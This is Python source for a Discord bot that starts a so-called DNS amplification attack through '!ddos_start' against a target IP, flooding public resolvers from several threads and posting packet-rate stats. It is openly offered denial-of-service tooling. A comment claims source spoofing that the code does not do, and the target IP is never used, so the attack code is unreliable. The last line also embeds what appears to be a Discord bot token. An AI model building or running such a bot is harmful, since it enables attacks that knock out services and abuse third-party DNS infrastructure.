import discord
from discord.ext import commands
import os
import socket
import random
import threading
import time
from dotenv import load_dotenv

load_dotenv()

# Bot Setup
intents = discord.Intents.default()
intents.messages = True
bot = commands.Bot(command_prefix="!", intents=intents)

# DNS Amplification Class
class DNSAmplifier:
    def __init__(self):
        self.running = False
        self.sent_packets = 0
        self.dns_servers = [
            '8.8.8.8',        # Google DNS
            '1.1.1.1',        # Cloudflare
            '9.9.9.9',        # Quad9
            '208.67.222.222', # OpenDNS
            '64.6.64.6'       # Verisign
        ]
        self.dns_queries = [
            "example.com", "google.com", "cloudflare.com",
            "facebook.com", "youtube.com", "wikipedia.org"
        ]

    def create_dns_query(self, query):
        transaction_id = os.urandom(2)
        flags = b'\x01\x00'  # Standard query
        questions = b'\x00\x01'
        answer_rrs = b'\x00\x00'
        authority_rrs = b'\x00\x00'
        additional_rrs = b'\x00\x00'
        
        qname = b''
        for part in query.split('.'):
            qname += bytes([len(part)]) + part.encode()
        qname += b'\x00'
        
        qtype = b'\x00\x01'  # A record
        qclass = b'\x00\x01'  # IN class
        
        return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass

    def attack(self, target_ip, duration, threads):
        self.running = True
        self.sent_packets = 0
        
        def attack_thread():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            while self.running:
                try:
                    dns_server = random.choice(self.dns_servers)
                    query = random.choice(self.dns_queries)
                    dns_packet = self.create_dns_query(query)
                    
                    # Spoof source IP (target becomes victim)
                    sock.sendto(dns_packet, (dns_server, 53))
                    self.sent_packets += 1
                except:
                    pass
        
        # Start threads
        for _ in range(threads):
            t = threading.Thread(target=attack_thread)
            t.daemon = True
            t.start()
        
        # Auto-stop after duration
        time.sleep(duration)
        self.running = False

# Initialize attacker
attacker = DNSAmplifier()

# Discord Commands
@bot.command(name="ddos_start")
async def start_attack(ctx, target_ip: str, duration: int = 10, threads: int = 5):
    allowed_users = list(map(int, os.getenv("ALLOWED_USER_IDS").split(',')))
    if ctx.author.id not in allowed_users:
        await ctx.send("❌ **You are not authorized to use this command!**")
        return
    
    await ctx.send(f"🚀 **Starting DNS Amplification Test on `{target_ip}` for `{duration}` seconds with `{threads}` threads...**")
    
    # Start attack in background
    attack_thread = threading.Thread(
        target=attacker.attack,
        args=(target_ip, duration, threads)
    )
    attack_thread.start()
    
    # Show stats
    start_time = time.time()
    while attacker.running:
        elapsed = time.time() - start_time
        pps = int(attacker.sent_packets / elapsed) if elapsed > 0 else 0
        await ctx.send(f"📊 **Attack Stats:** `{attacker.sent_packets}` packets | `{pps}` pps")
        time.sleep(5)
    
    await ctx.send("✅ **Attack completed!**")

@bot.command(name="ddos_stop")
async def stop_attack(ctx):
    attacker.running = False
    await ctx.send("🛑 **Attack stopped!**")

# Run Bot
bot.run(os.getenv("MTM1NTk2Njg5ODI5NDEwMDA1MQ.GbPJny.ISEoMmPDU7sw8GlIBIv6jsmutig1tuYp9h7o5w"))